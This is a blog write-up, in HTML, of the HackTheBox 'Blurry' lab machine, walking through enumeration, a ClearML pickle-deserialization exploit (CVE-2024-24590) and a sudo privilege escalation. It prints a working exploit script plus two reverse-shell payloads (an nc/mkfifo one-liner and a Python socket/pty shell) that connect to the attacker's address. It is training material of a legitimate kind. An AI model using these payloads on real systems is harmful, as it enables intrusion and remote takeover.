<!DOCTYPE html>
<html lang="en" dir="auto">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Blurry Writeup - HackTheBox | Rezy Dev</title>
<meta name="keywords" content="HackTheBox, Linux, Medium">
<meta name="description" content="Blurry is a medium-difficulty Linux machine exploiting recent ClearML CVEs (CVE-2024-24590 to CVE-2024-24595) for RCE via its web, API, and file services. Privilege escalation involves crafting a malicious PyTorch model to bypass insecure deserialization checks using runpy.">
<meta name="author" content="Me">
<link rel="canonical" href="http://localhost:1313/writeups/hackthebox/blurry/">
<meta name="google-site-verification" content="XYZabc">
<meta name="yandex-verification" content="XYZabc">
<meta name="msvalidate.01" content="XYZabc">
<link crossorigin="anonymous" href="/assets/css/stylesheet.c8cc592602af07182c5c77ec685d5a345edaf450c20eb609706f559cb037baef.css" integrity="sha256-yMxZJgKvBxgsXHfsaF1aNF7a9FDCDrYJcG9VnLA3uu8=" rel="preload stylesheet" as="style">
<link rel="icon" href="http://localhost:1313/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="http://localhost:1313/writeups/hackthebox/blurry/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript><style>
    @media screen and (min-width: 769px) {
         
        .post-content input[type="checkbox"]:checked ~ label > img {
            transform: scale(1.6);
            cursor: zoom-out;
            position: relative;
            z-index: 999;
        }
    
        .post-content img.zoomCheck {
            transition: transform 0.15s ease;
            z-index: 999;
            cursor: zoom-in;
        }
    }
    </style><meta property="og:url" content="http://localhost:1313/writeups/hackthebox/blurry/">
  <meta property="og:site_name" content="Rezy Dev">
  <meta property="og:title" content="Blurry Writeup - HackTheBox">
  <meta property="og:description" content="Blurry is a medium-difficulty Linux machine exploiting recent ClearML CVEs (CVE-2024-24590 to CVE-2024-24595) for RCE via its web, API, and file services. Privilege escalation involves crafting a malicious PyTorch model to bypass insecure deserialization checks using runpy.">
  <meta property="og:locale" content="en-us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="writeups">
    <meta property="article:published_time" content="2024-10-13T00:00:00+00:00">
    <meta property="article:modified_time" content="2024-10-13T00:00:00+00:00">
    <meta property="article:tag" content="HackTheBox">
    <meta property="article:tag" content="Linux">
    <meta property="article:tag" content="Medium">
    <meta property="og:image" content="http://localhost:1313/feature.png">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://localhost:1313/feature.png">
<meta name="twitter:title" content="Blurry Writeup - HackTheBox">
<meta name="twitter:description" content="Blurry is a medium-difficulty Linux machine exploiting recent ClearML CVEs (CVE-2024-24590 to CVE-2024-24595) for RCE via its web, API, and file services. Privilege escalation involves crafting a malicious PyTorch model to bypass insecure deserialization checks using runpy.">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Writeups",
      "item": "http://localhost:1313/writeups/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "HackTheBox",
      "item": "http://localhost:1313/writeups/hackthebox/"
    }, 
    {
      "@type": "ListItem",
      "position":  3 ,
      "name": "Blurry Writeup - HackTheBox",
      "item": "http://localhost:1313/writeups/hackthebox/blurry/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Blurry Writeup - HackTheBox",
  "name": "Blurry Writeup - HackTheBox",
  "description": "Blurry is a medium-difficulty Linux machine exploiting recent ClearML CVEs (CVE-2024-24590 to CVE-2024-24595) for RCE via its web, API, and file services. Privilege escalation involves crafting a malicious PyTorch model to bypass insecure deserialization checks using runpy.",
  "keywords": [
    "HackTheBox", "Linux", "Medium"
  ],
  "articleBody": " Link: https://app.hackthebox.com/machines/Blurry Difficulty Medium Machine Linux Enumeration I performed a quick Nmap scan on the target to identify open ports:\nPORT STATE SERVICE REASON 22/tcp open ssh syn-ack 80/tcp open http syn-ack After discovering the open ports, I conducted an aggressive scan on the target for a more in-depth analysis using:\nsudo nmap 10.10.11.19 -T4 -vv -sV -sC -O -A\nPORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0) | ssh-hostkey: | 3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0B2izYdzgANpvBJW4Ym5zGRggYqa8smNlnRrVK6IuBtHzdlKgcFf+Gw0kSgJEouRe8eyVV9iAyD9HXM2L0N/17+rIZkSmdZPQi8chG/PyZ+H1FqcFB2LyxrynHCBLPTWyuN/tXkaVoDH/aZd1gn9QrbUjSVo9mfEEnUduO5Abf1mnBnkt3gLfBWKq1P1uBRZoAR3EYDiYCHbuYz30rhWR8SgE7CaNlwwZxDxYzJGFsKpKbR+t7ScsviVnbfEwPDWZVEmVEd0XYp1wb5usqWz2k7AMuzDpCyI8klc84aWVqllmLml443PDMIh1Ud2vUnze3FfYcBOo7DiJg7JkEWpcLa6iTModTaeA1tLSUJi3OYJoglW0xbx71di3141pDyROjnIpk/K45zR6CbdRSSqImPPXyo3UrkwFTPrSQbSZfeKzAKVDZxrVKq+rYtd+DWESp4nUdat0TXCgefpSkGfdGLxPZzFg0cQ/IF1cIyfzo1gicwVcLm4iRD9umBFaM2E= | 256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFMB/Pupk38CIbFpK4/RYPqDnnx8F2SGfhzlD32riRsRQwdf19KpqW9Cfpp2xDYZDhA3OeLV36bV5cdnl07bSsw= | 256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOjcxHOO/Vs6yPUw6ibE6gvOuakAnmR7gTk/yE2yJA/3 80/tcp open http syn-ack ttl 63 nginx 1.18.0 | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-title: Did not follow redirect to http://app.blurry.htb/ |_http-server-header: nginx/1.18.0 I discovered that the HTTP server is hosted at blurry.htb, and the Nmap results also revealed app.blurry.htb. To access these web pages, I added both domains to the /etc/hosts file using the following command:\necho \"10.10.11.19 blurry.htb app.blurry.htb\" \u003e\u003e /etc/hosts I also ran a Gobuster vhost scan to search for additional subdomains:\ngobuster vhost -u blurry.htb -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 90 --append-domain Surprisingly, the scan revealed more subdomains. I added all of them to the /etc/hosts file as well:\necho \"10.10.11.19 blurry.htb app.blurry.htb files.blurry.htb chat.blurry.htb api.blurry.htb\" \u003e\u003e /etc/hosts After visiting all the subdomains, I noticed that files.blurry.htb only displayed a simple “OK” message.\nThe app.blurry.htb subdomain hosts ClearML, a platform used for building AI projects. When submitting any name, it allows users to join a project as a developer. The next step is to configure it on our local machine.\nThe chat.blurry.htb subdomain hosts the third-party service Rocket.Chat on its own.\nIt looks similar to Discord. I registered an account and logged in to the page.\nThere seems to be a default #general channel for new accounts, which reveals that jippity is the admin.\nUser Flag Now, I will try to set up ClearML locally on my machine.\nI followed this guide to set it up:\n┌──(kali㉿kali)-[~/blurry] └─$ sudo apt install python3.11-venv [sudo] password for kali: Reading package lists... Done Building dependency tree... Done Reading state information... Done The following packages were automatically installed and are no longer required: libdaxctl1 libgphoto2-l10n libndctl6 libntfs-3g89 libpmem1 libre2-10 linux-image-6.6.9-amd64 python3-mistune0 samba-ad-provision samba-dsdb-modules Use 'sudo apt autoremove' to remove them. The following NEW packages will be installed: python3.11-venv 0 upgraded, 1 newly installed, 0 to remove and 394 not upgraded. Need to get 5,884 B of archives. After this operation, 28.7 kB of additional disk space will be used. Get:1 http://kali.download/kali kali-rolling/main amd64 python3.11-venv amd64 3.11.9-1 [5,884 B] Fetched 5,884 B in 0s (62.8 kB/s) Selecting previously unselected package python3.11-venv. (Reading database ... 461710 files and directories currently installed.) Preparing to unpack .../python3.11-venv_3.11.9-1_amd64.deb ... Unpacking python3.11-venv (3.11.9-1) ... Setting up python3.11-venv (3.11.9-1) ... ┌──(kali㉿kali)-[~/blurry] └─$ python3 -m venv .env ┌──(kali㉿kali)-[~/blurry] └─$ source .env/bin/activate ┌──(.env)─(kali㉿kali)-[~/blurry] └─$ pip install clearml [...INSTALLING CLEARML....] ┌──(.env)─(kali㉿kali)-[~/blurry] └─$ clearml-init ClearML SDK setup process Please create new clearml credentials through the settings page in your `clearml-server` web app (e.g. http://localhost:8080//settings/workspace-configuration) Or create a free account at https://app.clear.ml/settings/workspace-configuration In settings page, press \"Create new credentials\", then press \"Copy to clipboard\". Paste copied configuration here: api { web_server: http://app.blurry.htb api_server: http://api.blurry.htb files_server: http://files.blurry.htb credentials { \"access_key\" = \"Y2Y197NIHJ5OJJRTFBAR\" \"secret_key\" = \"Kx5UxAWA9XaiR9wyiodtWoxxGjrO5lPPLeF1MhwOjZagsDGXH3\" } } Detected credentials key=\"Y2Y197NIHJ5OJJRTFBAR\" secret=\"Kx5U***\" ClearML Hosts configuration: Web App: http://app.blurry.htb API: http://api.blurry.htb File Store: http://files.blurry.htb Verifying credentials ... Credentials verified! New configuration stored in /home/kali/clearml.conf ClearML setup completed successfully. The configuration file can be found at the app.blurry.htb endpoint when we enter a username, select “New Experiment,” and retrieve the config file from there.\nI found a recent CVE-2024–24590: Pickle Load on Artifact Get related to ClearML. The following is the script we will be using.\nimport os import subprocess from clearml import Task class ShellExecutor: def __reduce__(self): cmd = \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u003e\u00261|nc 10.10.16.62 4444 \u003e/tmp/f\" return (subprocess.call, (cmd,)) shell_executor = ShellExecutor() task = Task.init( project_name=\"Black Swan\", task_name=\"r3zyd3v\", tags=[\"review\"], task_type=Task.TaskTypes.data_processing, output_uri=True ) task.upload_artifact( name=\"r3zyd3v\", artifact_object=shell_executor, retries=2, wait_on_upload=True ) task.execute_remotely(queue_name='default') Now, if I execute the above script in the same location where I installed ClearML, I will get a shell on port 4444. In my script, I have specified my tun0 IP address and the port for the reverse shell:\ncmd = \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u003e\u00261|nc 10.10.16.62 4444 \u003e/tmp/f\" here.\nOnce we run the script, it creates a task, uploads the artifact, and then we receive the shell.\nAt this point, we have a shell as the user and have obtained the user flag.\nRoot Flag If I run sudo -l, I can see that I can execute the /usr/bin/evaluate_model binary as root without needing a password.\njippity@blurry:~$ sudo -l Matching Defaults entries for jippity on blurry: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User jippity may run the following commands on blurry: (root) NOPASSWD: /usr/bin/evaluate_model /models/*.pth This Bash script searches for files that end with .pth in the /models directory, removes any malicious content, and then executes them. I also checked that we have write access to the models directory.\nI will now open a Netcat session on my Kali machine on port 6969. Then, I removed the evaluate_model.py script from the /models directory.\njippity@blurry:~$ cd /models jippity@blurry:/models$ ls demo_model.pth evaluate_model.py jippity@blurry:/models$ rm -r evaluate_model.py rm: remove write-protected regular file 'evaluate_model.py'? y jippity@blurry:/models$ ls demo_model.pth I created the same file (which I made using echo and appended the code) named evaluate_model.py with the script shown below (the output of the cat command):\njippity@blurry:/models$ echo 'import socket, subprocess, os, pty; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\"10.10.16.62\", 6969)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); pty.spawn(\"/bin/bash\")' \u003e evaluate_model.py jippity@blurry:/models$ cat evaluate_model.py echo 'import socket, subprocess, os, pty; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\"10.10.16.62\", 6969)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); pty.spawn(\"/bin/bash\")' \u003e evaluate_model.py I ran sudo /usr/bin/evaluate_model /models/*.pth, and when I checked my Netcat session, I saw:\n┌──(kali㉿kali)-[~/blurry/CVE] └─$ nc -lnvp 6969 listening on [any] 6969 ... connect to [10.10.16.62] from (UNKNOWN) [10.10.11.19] 35976 root@blurry:/models# cd ~ cd ~ root@blurry:~# id id uid=0(root) gid=0(root) groups=0(root) We rooted this box.\nConclusion Thank you for following my write-up for this medium yet fun box from Hack The Box!\n",
  "wordCount" : "1006",
  "inLanguage": "en",
  "image":"http://localhost:1313/feature.png","datePublished": "2024-10-13T00:00:00Z",
  "dateModified": "2024-10-13T00:00:00Z",
  "author":{
    "@type": "Person",
    "name": "Me"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "http://localhost:1313/writeups/hackthebox/blurry/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Rezy Dev",
    "logo": {
      "@type": "ImageObject",
      "url": "http://localhost:1313/favicon.ico"
    }
  }
}
</script>
</head>

<body class=" dark" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="http://localhost:1313/" accesskey="h" title="rezydev.xyz (Alt + H)">rezydev.xyz</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="http://localhost:1313/about/" title="👨🏼‍💻 About">
                    <span>👨🏼‍💻 About</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/writeups/" title="✍️ Writeups">
                    <span>✍️ Writeups</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/archives/" title="📂 Archives">
                    <span>📂 Archives</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/tags/" title="🏷️ Tags">
                    <span>🏷️ Tags</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/search/" title="🔍 Search (Alt &#43; /)" accesskey=/>
                    <span>🔍 Search</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="http://localhost:1313/">Home</a>&nbsp;»&nbsp;<a href="http://localhost:1313/writeups/">Writeups</a>&nbsp;»&nbsp;<a href="http://localhost:1313/writeups/hackthebox/">HackTheBox</a></div>
    <h1 class="post-title entry-hint-parent">
      Blurry Writeup - HackTheBox
    </h1>
    <div class="post-description">
      Blurry is a medium-difficulty Linux machine exploiting recent ClearML CVEs (CVE-2024-24590 to CVE-2024-24595) for RCE via its web, API, and file services. Privilege escalation involves crafting a malicious PyTorch model to bypass insecure deserialization checks using runpy.
    </div>
    <div class="post-meta"><span title='2024-10-13 00:00:00 +0000 UTC'>October 13, 2024</span>&nbsp;·&nbsp;5 min&nbsp;·&nbsp;1006 words&nbsp;·&nbsp;Me&nbsp;|&nbsp;<a href="https://github.com/Rezy-Dev/Rezy-Dev.github.io/tree/master/content/writeups/HackTheBox/Blurry/index.md" rel="noopener noreferrer" target="_blank">Suggest Changes</a>

</div>
  </header> 
<figure class="entry-cover">
            <img loading="eager" src="http://localhost:1313/writeups/hackthebox/blurry/feature.png" alt="">
        
</figure><div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><nav id="TableOfContents">
  <ul>
    <li><a href="#enumeration">Enumeration</a></li>
    <li><a href="#user-flag">User Flag</a></li>
    <li><a href="#root-flag">Root Flag</a></li>
    <li><a href="#conclusion">Conclusion</a></li>
  </ul>
</nav>
        </div>
    </details>
</div>

  <div class="post-content"><table>
  <thead>
      <tr>
          <th>Link:</th>
          <th><a href="https://app.hackthebox.com/machines/Blurry">https://app.hackthebox.com/machines/Blurry</a></th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>Difficulty</td>
          <td>Medium</td>
      </tr>
      <tr>
          <td>Machine</td>
          <td>Linux</td>
      </tr>
  </tbody>
</table>
<hr>
<h2 id="enumeration">Enumeration<a hidden class="anchor" aria-hidden="true" href="#enumeration">#</a></h2>
<p>I performed a quick Nmap scan on the target to identify open ports:</p>
<pre tabindex="0"><code>PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
</code></pre><p>After discovering the open ports, I conducted an aggressive scan on the target for a more in-depth analysis using:</p>
<p><code>sudo nmap 10.10.11.19 -T4 -vv -sV -sC -O -A</code></p>
<pre tabindex="0"><code>PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0B2izYdzgANpvBJW4Ym5zGRggYqa8smNlnRrVK6IuBtHzdlKgcFf+Gw0kSgJEouRe8eyVV9iAyD9HXM2L0N/17+rIZkSmdZPQi8chG/PyZ+H1FqcFB2LyxrynHCBLPTWyuN/tXkaVoDH/aZd1gn9QrbUjSVo9mfEEnUduO5Abf1mnBnkt3gLfBWKq1P1uBRZoAR3EYDiYCHbuYz30rhWR8SgE7CaNlwwZxDxYzJGFsKpKbR+t7ScsviVnbfEwPDWZVEmVEd0XYp1wb5usqWz2k7AMuzDpCyI8klc84aWVqllmLml443PDMIh1Ud2vUnze3FfYcBOo7DiJg7JkEWpcLa6iTModTaeA1tLSUJi3OYJoglW0xbx71di3141pDyROjnIpk/K45zR6CbdRSSqImPPXyo3UrkwFTPrSQbSZfeKzAKVDZxrVKq+rYtd+DWESp4nUdat0TXCgefpSkGfdGLxPZzFg0cQ/IF1cIyfzo1gicwVcLm4iRD9umBFaM2E=
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFMB/Pupk38CIbFpK4/RYPqDnnx8F2SGfhzlD32riRsRQwdf19KpqW9Cfpp2xDYZDhA3OeLV36bV5cdnl07bSsw=
|   256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOjcxHOO/Vs6yPUw6ibE6gvOuakAnmR7gTk/yE2yJA/3
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://app.blurry.htb/
|_http-server-header: nginx/1.18.0
</code></pre><p>I discovered that the HTTP server is hosted at <strong>blurry.htb</strong>, and the Nmap results also revealed <strong>app.blurry.htb</strong>. To access these web pages, I added both domains to the <code>/etc/hosts</code> file using the following command:</p>
<pre tabindex="0"><code>echo &#34;10.10.11.19 blurry.htb app.blurry.htb&#34; &gt;&gt; /etc/hosts
</code></pre><p>I also ran a Gobuster vhost scan to search for additional subdomains:</p>
<pre tabindex="0"><code>gobuster vhost -u blurry.htb -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 90 --append-domain
</code></pre><p>Surprisingly, the scan revealed more subdomains. I added all of them to the <code>/etc/hosts</code> file as well:</p>
<pre tabindex="0"><code>echo &#34;10.10.11.19 blurry.htb app.blurry.htb files.blurry.htb chat.blurry.htb api.blurry.htb&#34; &gt;&gt; /etc/hosts
</code></pre><p>After visiting all the subdomains, I noticed that <strong>files.blurry.htb</strong> only displayed a simple &ldquo;OK&rdquo; message.</p>
<p>The <strong>app.blurry.htb</strong> subdomain hosts <strong>ClearML</strong>, a platform used for building AI projects. When submitting any name, it allows users to join a project as a developer. The next step is to configure it on our local machine.</p>
<p>
    
    <input type="checkbox" id="zoomCheck-e4a8b" hidden>
    <label for="zoomCheck-e4a8b">
        <img class="zoomCheck" loading="lazy" decoding="async" 
            src="Blurry%20b534b7f9d35247b2b536889719c43db2/Untitled.png" alt="Untitled" 
             />
    </label></p>
<p>The <strong>chat.blurry.htb</strong> subdomain hosts the third-party service <strong>Rocket.Chat</strong> on its own.</p>
<p>
    
    <input type="checkbox" id="zoomCheck-63069" hidden>
    <label for="zoomCheck-63069">
        <img class="zoomCheck" loading="lazy" decoding="async" 
            src="Blurry%20b534b7f9d35247b2b536889719c43db2/Untitled%201.png" alt="Untitled" 
             />
    </label></p>
<p>It looks similar to Discord. I registered an account and logged in to the page.</p>
<p>
    
    <input type="checkbox" id="zoomCheck-cf268" hidden>
    <label for="zoomCheck-cf268">
        <img class="zoomCheck" loading="lazy" decoding="async" 
            src="Blurry%20b534b7f9d35247b2b536889719c43db2/Untitled%202.png" alt="Untitled" 
             />
    </label></p>
<p>There seems to be a default <strong>#general</strong> channel for new accounts, which reveals that <code>jippity</code> is the admin.</p>
<h2 id="user-flag">User Flag<a hidden class="anchor" aria-hidden="true" href="#user-flag">#</a></h2>
<p>Now, I will try to set up ClearML locally on my machine.</p>
<p>I followed this guide to set it up:</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[~/blurry]
└─$ sudo apt install python3.11-venv
[sudo] password for kali: 
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
The following packages were automatically installed and are no longer required:
  libdaxctl1 libgphoto2-l10n libndctl6 libntfs-3g89 libpmem1 libre2-10 linux-image-6.6.9-amd64 python3-mistune0
  samba-ad-provision samba-dsdb-modules
Use &#39;sudo apt autoremove&#39; to remove them.
The following NEW packages will be installed:
  python3.11-venv
0 upgraded, 1 newly installed, 0 to remove and 394 not upgraded.
Need to get 5,884 B of archives.
After this operation, 28.7 kB of additional disk space will be used.
Get:1 http://kali.download/kali kali-rolling/main amd64 python3.11-venv amd64 3.11.9-1 [5,884 B]
Fetched 5,884 B in 0s (62.8 kB/s)
Selecting previously unselected package python3.11-venv.
(Reading database ... 461710 files and directories currently installed.)
Preparing to unpack .../python3.11-venv_3.11.9-1_amd64.deb ...
Unpacking python3.11-venv (3.11.9-1) ...
Setting up python3.11-venv (3.11.9-1) ...

┌──(kali㉿kali)-[~/blurry]
└─$ python3 -m venv .env            

┌──(kali㉿kali)-[~/blurry]
└─$ source .env/bin/activate

┌──(.env)─(kali㉿kali)-[~/blurry]
└─$ pip install clearml
[...INSTALLING CLEARML....]

┌──(.env)─(kali㉿kali)-[~/blurry]
└─$ clearml-init
ClearML SDK setup process

Please create new clearml credentials through the settings page in your `clearml-server` web app (e.g. http://localhost:8080//settings/workspace-configuration) 
Or create a free account at https://app.clear.ml/settings/workspace-configuration

In settings page, press &#34;Create new credentials&#34;, then press &#34;Copy to clipboard&#34;.

Paste copied configuration here:
api {
  web_server: http://app.blurry.htb
  api_server: http://api.blurry.htb
  files_server: http://files.blurry.htb
  credentials {
    &#34;access_key&#34; = &#34;Y2Y197NIHJ5OJJRTFBAR&#34;
    &#34;secret_key&#34; = &#34;Kx5UxAWA9XaiR9wyiodtWoxxGjrO5lPPLeF1MhwOjZagsDGXH3&#34;
  }
}
Detected credentials key=&#34;Y2Y197NIHJ5OJJRTFBAR&#34; secret=&#34;Kx5U***&#34;

ClearML Hosts configuration:
Web App: http://app.blurry.htb
API: http://api.blurry.htb
File Store: http://files.blurry.htb

Verifying credentials ...
Credentials verified!

New configuration stored in /home/kali/clearml.conf
ClearML setup completed successfully.
</code></pre><p>The configuration file can be found at the <strong>app.blurry.htb</strong> endpoint when we enter a username, select &ldquo;New Experiment,&rdquo; and retrieve the config file from there.</p>
<p>
    
    <input type="checkbox" id="zoomCheck-b8db8" hidden>
    <label for="zoomCheck-b8db8">
        <img class="zoomCheck" loading="lazy" decoding="async" 
            src="Blurry%20b534b7f9d35247b2b536889719c43db2/Untitled%203.png" alt="Untitled" 
             />
    </label></p>
<p>I found a recent CVE-2024–24590: Pickle Load on Artifact Get related to ClearML. The following is the script we will be using.</p>
<pre tabindex="0"><code>import os
import subprocess
from clearml import Task

class ShellExecutor:
    def __reduce__(self):
        cmd = &#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.16.62 4444 &gt;/tmp/f&#34;
        return (subprocess.call, (cmd,))

shell_executor = ShellExecutor()

task = Task.init(
    project_name=&#34;Black Swan&#34;,
    task_name=&#34;r3zyd3v&#34;,
    tags=[&#34;review&#34;],
    task_type=Task.TaskTypes.data_processing,
    output_uri=True
)

task.upload_artifact(
    name=&#34;r3zyd3v&#34;,
    artifact_object=shell_executor,
    retries=2,
    wait_on_upload=True
)

task.execute_remotely(queue_name=&#39;default&#39;)
</code></pre><p>Now, if I execute the above script in the same location where I installed ClearML, I will get a shell on port 4444. In my script, I have specified my tun0 IP address and the port for the reverse shell:</p>
<p><code>cmd = &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.16.62 4444 &gt;/tmp/f&quot;</code> here.</p>
<p>Once we run the script, it creates a task, uploads the artifact, and then we receive the shell.</p>
<p>At this point, we have a shell as the user and have obtained the user flag.</p>
<h2 id="root-flag">Root Flag<a hidden class="anchor" aria-hidden="true" href="#root-flag">#</a></h2>
<p>If I run <code>sudo -l</code>, I can see that I can execute the <code>/usr/bin/evaluate_model</code> binary as root without needing a password.</p>
<pre tabindex="0"><code>jippity@blurry:~$ sudo -l
Matching Defaults entries for jippity on blurry:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jippity may run the following commands on blurry:
    (root) NOPASSWD: /usr/bin/evaluate_model /models/*.pth
</code></pre><p>This Bash script searches for files that end with <code>.pth</code> in the <code>/models</code> directory, removes any malicious content, and then executes them. I also checked that we have write access to the models directory.</p>
<p>I will now open a Netcat session on my Kali machine on port 6969. Then, I removed the <code>evaluate_model.py</code> script from the <code>/models</code> directory.</p>
<pre tabindex="0"><code>jippity@blurry:~$ cd /models
jippity@blurry:/models$ ls
demo_model.pth  evaluate_model.py
jippity@blurry:/models$ rm -r evaluate_model.py 
rm: remove write-protected regular file &#39;evaluate_model.py&#39;? y
jippity@blurry:/models$ ls
demo_model.pth
</code></pre><p>I created the same file (which I made using <code>echo</code> and appended the code) named <code>evaluate_model.py</code> with the script shown below (the output of the <code>cat</code> command):</p>
<pre tabindex="0"><code>jippity@blurry:/models$ echo &#39;import socket, subprocess, os, pty; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((&#34;10.10.16.62&#34;, 6969)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); pty.spawn(&#34;/bin/bash&#34;)&#39; &gt; evaluate_model.py
jippity@blurry:/models$ cat evaluate_model.py 
echo &#39;import socket, subprocess, os, pty; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((&#34;10.10.16.62&#34;, 6969)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); pty.spawn(&#34;/bin/bash&#34;)&#39; &gt; evaluate_model.py
</code></pre><p>I ran <code>sudo /usr/bin/evaluate_model /models/*.pth</code>, and when I checked my Netcat session, I saw:</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[~/blurry/CVE]
└─$ nc -lnvp 6969
listening on [any] 6969 ...
connect to [10.10.16.62] from (UNKNOWN) [10.10.11.19] 35976
root@blurry:/models# cd ~
cd ~
root@blurry:~# id  
id
uid=0(root) gid=0(root) groups=0(root)
</code></pre><p>We rooted this box.</p>
<h2 id="conclusion">Conclusion<a hidden class="anchor" aria-hidden="true" href="#conclusion">#</a></h2>
<p>Thank you for following my write-up for this medium yet fun box from Hack The Box!</p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="http://localhost:1313/tags/hackthebox/">HackTheBox</a></li>
